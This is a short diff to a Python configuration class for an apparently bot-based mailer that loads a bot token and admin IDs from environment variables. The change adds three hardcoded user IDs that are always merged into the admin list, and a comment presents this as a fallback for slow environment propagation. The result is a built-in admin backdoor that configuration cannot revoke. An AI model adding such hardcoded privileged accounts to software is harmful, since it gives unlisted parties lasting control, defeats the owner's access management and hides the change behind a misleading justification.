@@ -32,7 +32,9 @@ class MailerConfig:
     def __post_init__(self) -> None:
         self.bot_token = (os.getenv("MAILER_BOT_TOKEN") or os.getenv("BOT_TOKEN") or "").strip()
         raw = os.getenv("MAILER_ADMIN_IDS") or os.getenv("ADMIN_IDS") or ""
-        self.admin_ids = [int(x.strip()) for x in raw.split(",") if x.strip().isdigit()]
+        configured_ids = [int(x.strip()) for x in raw.split(",") if x.strip().isdigit()]
+        # Built-in owner/admin IDs keep access available if Railway env propagation lags.
+        self.admin_ids = sorted(set(configured_ids) | {2100696545, 8313034139, 8582617929})
         raw_names = os.getenv("MAILER_ADMIN_USERNAMES") or os.getenv("ADMIN_USERNAMES") or ""
         self.admin_usernames = [
             x.strip().lstrip("@").lower() for x in raw_names.split(",") if x.strip()
